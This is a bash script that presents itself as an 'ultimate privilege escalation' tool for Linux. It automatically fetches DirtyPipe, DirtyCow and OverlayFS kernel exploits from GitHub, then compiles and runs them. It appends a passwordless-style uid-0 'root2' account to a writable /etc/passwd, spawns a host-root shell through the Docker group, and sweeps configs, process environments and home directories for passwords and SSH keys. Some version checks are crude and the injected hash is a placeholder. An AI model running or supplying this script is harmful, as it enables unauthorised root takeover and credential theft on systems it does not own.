#!/bin/bash
# Ultimate Privilege Escalation Script
version="4.0"

LOGFILE="LinEnum_Exploit_$(date +%Y%m%d_%H%M%S).log"

log() {
  echo -e "$1" | tee -a "$LOGFILE"
}

log "\e[00;31m[+] Running as $(whoami)\e[00m"

## Kernel Info & Exploit Check
log "\e[00;33m### SYSTEM INFO ###\e[00m"
log "Kernel: $(uname -r)"
log "OS: $(cat /etc/os-release 2>/dev/null | grep 'PRETTY_NAME' | cut -d= -f2)"

# Exploits Directory
EXPLOIT_DIR="/tmp/exploits"
mkdir -p $EXPLOIT_DIR

## Kernel Exploit Checks
log "[*] Checking for kernel vulnerabilities..."

# DirtyPipe Exploit
if uname -r | grep -q "5.10.0"; then
  log "\e[00;33m[+] This kernel is vulnerable to DirtyPipe!\e[00m"
  curl -s -o $EXPLOIT_DIR/dirtypipe.c https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
  gcc $EXPLOIT_DIR/dirtypipe.c -o $EXPLOIT_DIR/dirtypipe && $EXPLOIT_DIR/dirtypipe
fi

# DirtyCow Exploit
if uname -r | grep -q "4.8.0"; then
  log "\e[00;33m[+] Kernel appears vulnerable to DirtyCow!\e[00m"
  curl -s -o $EXPLOIT_DIR/dirtycow.c https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
  gcc $EXPLOIT_DIR/dirtycow.c -o $EXPLOIT_DIR/dirtycow -pthread && $EXPLOIT_DIR/dirtycow
fi

# OverlayFS Exploit (Linux 5.x)
if uname -r | grep -q "5."; then
  log "\e[00;33m[+] OverlayFS exploit available!\e[00m"
  curl -s -o $EXPLOIT_DIR/overlayfs.c https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
  gcc $EXPLOIT_DIR/overlayfs.c -o $EXPLOIT_DIR/overlayfs && $EXPLOIT_DIR/overlayfs
fi

## Identify SUID Binaries & Auto-Exploit
log "\e[00;33m### SUID BINARIES ###\e[00m"
suid_binaries=$(find / -perm -4000 -type f 2>/dev/null)
echo "$suid_binaries" | tee -a "$LOGFILE"

for binary in $suid_binaries; do
  if echo "$binary" | grep -qE "nmap|vim|awk|perl|python|find|less|tar"; then
    log "\e[00;33m[+] Exploitable SUID binary found: $binary (GTFOBins Exploit Available!)\e[00m"
  fi
done

## Writable Sensitive Files & Exploit
log "\e[00;33m### WRITABLE SENSITIVE FILES ###\e[00m"
for file in /etc/passwd /etc/shadow /etc/sudoers; do
  if [ -w "$file" ]; then
    log "Writable file found: $file"
    if [ "$file" == "/etc/passwd" ]; then
      log "[+] Injecting a new root user!"
      echo "root2:\$6\$s3cr3t\$hash::0:0::/root:/bin/bash" >> /etc/passwd
      log "[+] New root user added! Try logging in as 'root2'!"
    fi
  fi
done

## Sticky Bit & World Writable Directories
log "\e[00;33m### STICKY BIT & WORLD WRITABLE DIRS ###\e[00m"
ww_dirs=$(find / -type d -perm -0002 -exec ls -ld {} + 2>/dev/null)
if [ "$ww_dirs" ]; then
  log "\e[00;33m[+] World-writable directories:\e[00m\n$ww_dirs"
fi

## Sudo Privilege Escalation
log "\e[00;33m### SUDO EXPLOITATION ###\e[00m"
sudo -l 2>/dev/null | tee -a "$LOGFILE"

## Hardcoded Passwords in Configs
log "\e[00;33m### HARDCODED PASSWORD SEARCH ###\e[00m"
grep -r "password" /home /etc /var/www 2>/dev/null | grep -v "No such file"

## Check if User is Part of Admin Groups
log "\e[00;33m### ADMIN GROUP MEMBERSHIP ###\e[00m"
id | grep -E "sudo|admin|root"

## SSH Private Keys & Credentials
log "\e[00;33m### SSH KEYS ###\e[00m"
find /home /root -name "id_rsa" -exec ls -la {} 2>/dev/null \;

## Cron Job Escalation Checks
log "\e[00;33m### CRON JOBS ###\e[00m"
find /etc/cron* -perm -0002 -type f -exec ls -la {} \;

## Check Running Processes for Exploitable Binaries
log "\e[00;33m### RUNNING PROCESSES ###\e[00m"
ps aux | grep -E "nc|perl|python|bash|sh|gcc|gdb" 2>/dev/null

## Docker Privileges & Exploit
log "\e[00;33m### DOCKER PRIVILEGES ###\e[00m"
if docker --version &>/dev/null; then
  log "Docker Installed: $(docker --version)"
  log "Checking for running containers..."
  log "$(docker ps -a 2>/dev/null)"
  
  if groups | grep -q docker; then
    log "\e[00;33m[+] User is in the docker group! Possible privilege escalation.\e[00m"
    log "[*] Running root shell in a container..."
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  fi
else
  log "Docker not installed"
fi

## Scan Environment Variables for Sensitive Data
log "\e[00;33m### ENVIRONMENT VARIABLES ###\e[00m"
strings /proc/*/environ 2>/dev/null | grep -i "PASS\|SECRET"

## Hash Critical Files for Integrity
log "\e[00;33m### FILE HASHES ###\e[00m"
for file in /etc/passwd /etc/shadow /etc/sudoers; do
  if [ -f "$file" ]; then
    log "$(sha256sum $file)"
  fi
done

log "\e[00;32m### SCAN COMPLETE ###\e[00m"
